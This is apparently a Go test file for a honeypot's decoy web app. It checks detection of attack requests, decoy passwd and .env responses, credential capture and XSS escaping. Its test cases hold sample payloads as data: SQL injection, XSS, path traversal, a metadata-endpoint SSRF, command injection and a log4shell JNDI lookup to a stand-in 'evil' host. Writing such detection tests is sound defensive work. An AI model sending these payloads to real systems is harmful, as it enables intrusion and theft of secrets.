package handler

import (
	"context"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/rom/tarpit-honeypot/internal/config"
	"github.com/rom/tarpit-honeypot/internal/identity"
)

func TestWebappAttackDetection(t *testing.T) {
	cases := []struct {
		line string
		want string
	}{
		{"GET /product.php?id=1'+OR+'1'='1 HTTP/1.1", "webapp:sqli"},
		{"GET /search.php?q=<script>alert(1)</script> HTTP/1.1", "webapp:xss"},
		{"GET /download.php?file=../../../../etc/passwd HTTP/1.1", "webapp:lfi"},
		{"GET /index.php?page=http://169.254.169.254/latest/meta-data HTTP/1.1", "webapp:rfi_ssrf"},
		{"GET /api/user?id=1;id HTTP/1.1", "webapp:cmdi"},
		{"GET /search.php?q={{7*7}} HTTP/1.1", "webapp:ssti"},
		{"GET /?x=${jndi:ldap://evil/a} HTTP/1.1", "webapp:log4shell"},
	}
	for _, c := range cases {
		res := Result{Meta: map[string]any{}}
		_ = serveWebapp(c.line, nil, "nginx", nil, &res)
		anoms, _ := res.Meta["anomalies"].([]string)
		if !slices.Contains(anoms, c.want) {
			t.Errorf("%q: anomalies=%v; want %s", c.line, anoms, c.want)
		}
	}
}

func TestWebappRoutesAndDeception(t *testing.T) {
	id := identity.New("webapp-test")

	res := Result{Meta: map[string]any{}}
	out := serveWebapp("GET / HTTP/1.1", nil, "nginx", id, &res)
	if !strings.Contains(out, "200 OK") || !strings.Contains(out, "X-Powered-By: PHP") {
		t.Errorf("home response malformed: %q", out)
	}

	// LFI toward /etc/passwd returns the fake passwd (active deception).
	res = Result{Meta: map[string]any{}}
	out = serveWebapp("GET /download.php?file=/etc/passwd HTTP/1.1", nil, "nginx", id, &res)
	if !strings.Contains(out, "root:x:0:0:") {
		t.Errorf("passwd deception missing: %q", out)
	}
	if anoms, _ := res.Meta["anomalies"].([]string); !slices.Contains(anoms, "webapp:lfi") {
		t.Errorf("passwd request not flagged lfi: %v", res.Meta["anomalies"])
	}

	// .env returns fake env + flags secret-file-probe.
	res = Result{Meta: map[string]any{}}
	out = serveWebapp("GET /.env HTTP/1.1", nil, "nginx", id, &res)
	if !strings.Contains(out, "DB_PASSWORD=") {
		t.Errorf(".env deception missing: %q", out)
	}
	if anoms, _ := res.Meta["anomalies"].([]string); !slices.Contains(anoms, "webapp:secret-file-probe") {
		t.Errorf(".env not flagged: %v", res.Meta["anomalies"])
	}

	// Login POST captures credentials.
	res = Result{Meta: map[string]any{}}
	_ = serveWebapp("POST /login.php HTTP/1.1", []byte("username=admin&password=hunter2"), "nginx", id, &res)
	if res.Meta["http_login_user"] != "admin" {
		t.Errorf("login user not captured: %v", res.Meta)
	}

	// Unknown path → 404.
	res = Result{Meta: map[string]any{}}
	out = serveWebapp("GET /nope HTTP/1.1", nil, "nginx", id, &res)
	if !strings.Contains(out, "404 Not Found") {
		t.Errorf("expected 404: %q", out)
	}
}

// cfg.Webapp must route the http handler into the fake app end-to-end.
func TestWebappViaHTTPHandler(t *testing.T) {
	client, server := pipePair(t)
	cfg := config.Listener{Handler: "http", Webapp: true, ReadBytes: 4096, ReadTimeout: time.Second}
	done := make(chan struct{})
	var res Result
	go func() {
		defer close(done)
		res, _ = (&httpH{}).Handle(context.Background(), server, cfg)
	}()
	_, _ = client.Write([]byte("GET /.env HTTP/1.1\r\nHost: x\r\n\r\n"))
	buf := make([]byte, 4096)
	n, _ := client.Read(buf)
	_ = client.Close()
	<-done
	if !strings.Contains(string(buf[:n]), "DB_PASSWORD=") {
		t.Errorf("webapp not served via http handler: %q", string(buf[:n]))
	}
	if anoms, _ := res.Meta["anomalies"].([]string); !slices.Contains(anoms, "webapp:secret-file-probe") {
		t.Errorf("not flagged: %v", res.Meta["anomalies"])
	}
}

// FuzzWebapp drives the fake-app router with arbitrary request lines +
// bodies; a panic fails the input.
func FuzzWebapp(f *testing.F) {
	f.Add("GET /search.php?q=<script> HTTP/1.1", "")
	f.Add("POST /login.php HTTP/1.1", "username=a&password=b")
	f.Add("GET /download.php?file=../../etc/passwd HTTP/1.1", "")
	f.Add("GET /index.php?page=${jndi:ldap://x/a} HTTP/1.1", "")
	f.Fuzz(func(t *testing.T, line, body string) {
		res := Result{Meta: map[string]any{}}
		_ = serveWebapp(line, []byte(body), "nginx", nil, &res)
	})
}

// The webapp must DETECT XSS without itself being a real reflected-XSS sink:
// reflected input has to come back HTML-escaped.
func TestWebappXSSReflectionEscaped(t *testing.T) {
	res := Result{Meta: map[string]any{}}
	out := serveWebapp("GET /search.php?q=<script>alert(1)</script> HTTP/1.1", nil, "nginx", nil, &res)
	if strings.Contains(out, "<script>alert(1)</script>") {
		t.Error("reflected raw <script> — honeypot is a real XSS vector")
	}
	if !strings.Contains(out, "&lt;script&gt;") {
		t.Errorf("expected HTML-escaped reflection in: %q", out)
	}
}
